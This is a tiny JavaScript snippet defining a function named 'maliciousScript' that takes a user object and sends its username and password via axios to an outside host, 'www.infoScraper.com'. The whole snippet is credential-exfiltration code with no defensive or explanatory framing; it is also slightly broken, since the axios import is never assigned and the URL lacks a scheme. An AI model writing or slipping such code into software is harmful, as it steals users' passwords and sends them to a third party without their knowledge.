require('axios')

const maliciousScript = (usr) => {
  axios.post('www.infoScraper.com', { username: usr.username, password: usr.password })
}
